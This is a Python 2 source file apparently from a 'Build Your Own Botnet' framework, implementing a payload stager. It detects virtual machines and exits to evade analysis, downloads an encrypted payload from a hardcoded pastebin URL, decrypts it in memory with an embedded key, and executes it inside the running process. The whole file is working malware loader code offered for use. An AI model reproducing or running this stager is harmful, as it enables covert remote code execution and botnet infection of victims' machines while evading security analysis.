#!/usr/bin/python
# -*- coding: utf-8 -*-
'Stager (Build Your Own Botnet)'

# standard libarary
import os
import sys
import imp
import struct
import base64
import urllib
import logging

# globals
__debug  = bool('--debug' in sys.argv)
__logger = logging.getLogger('STAGER')
logging.basicConfig(level=logging.DEBUG if __debug else logging.ERROR, handler=logging.StreamHandler())

# main
def decrypt(data, key, block_size=8, key_size=16, num_rounds=32):
    """
    XOR decryption 

    `Required`
    :param str data:        ciphertext to decrypt
    :param str key:         128-bit encryption key

    `Optional`
    :param int block_size:  block size (bytes)
    :param int key_size:    key size (bytes)
    :param int num_rounds:  number of cycles/rounds
    """
    try:
        data    = base64.b64decode(data)
        blocks  = [data[i * block_size:((i + 1) * block_size)] for i in range(len(data) // block_size)]
        vector  = blocks[0]
        result  = []
        for block in blocks[1:]:
            u,v = struct.unpack("!2L", block)
            k   = struct.unpack("!4L", key)
            d,m = 0x9e3779b9L, 0xffffffffL
            s   = (d * 32) & m
            for _ in xrange(num_rounds):
                v   = (v - (((u << 4 ^ u >> 5) + u) ^ (s + k[s >> 11 & 3]))) & m
                s   = (s - d) & m
                u   = (u - (((v << 4 ^ v >> 5) + v) ^ (s + k[s & 3]))) & m
            packed  = struct.pack("!2L", u, v)
            output  = bytes().join(chr(ord(x) ^ ord(y)) for x, y in zip(vector, packed))
            vector  = block
            result.append(output)
        return bytes().join(result).rstrip(chr(0))
    except Exception as e:
        __logger.error("{} returned error: {}".format(decrypt.func_name, str(e)))

def environment():
    """
    Returns True if environment is virtualized, otherwise False
    """
    try:
        environment = [key for key in os.environ if 'VBOX' in key]
        processes   = [i.split()[0 if os.name == 'nt' else -1] for i in os.popen('tasklist' if os.name == 'nt' else 'ps').read().splitlines()[3:] if i.split()[0 if os.name == 'nt' else -1].lower().split('.')[0] in ['xenservice', 'vboxservice', 'vboxtray', 'vmusrvc', 'vmsrvc', 'vmwareuser','vmwaretray', 'vmtoolsd', 'vmcompute', 'vmmem']]
        return bool(environment + processes)
    except Exception as e:
        __logger.error("{} returned error: {}".format(environment.func_name, str(e)))

def run(url, key):
    """
    Run the client payload stager

    `Required`
    :param str url:    URL hosting the encrypted payload
    :param str key:    128-bit decryption key to decrypt payload
    """
    try:
        __logger.info("checking environment...")
        if environment():
            if __debug:
                if raw_input("Virtual machine detected. Abort? (y/n): ").startswith('y'):
                    sys.exit(0)
            else:
                sys.exit(0)
        __logger.info("loading payload remotely from {}".format(url))
        data = urllib.urlopen(url).read()
        __logger.info("decrypting payload in-memory with 128-bit key: {}".format(key))
        code = decrypt(data, base64.b64decode(key))
        __logger.info("importing payload into the currently running process")
        payload = imp.new_module('payload')
        exec code in payload.__dict__
        __logger.info("starting client...")
        sys.modules['payload'] = payload
        return payload
    except Exception as e:
        __logger.error("{} returned error: {}".format(run.func_name, str(e)))

if __name__ == '__main__':
    x = run(url='https://pastebin.com/raw/0QkJSQas', key='BxU9yNwWDQQLeRYhstOSiQ==')
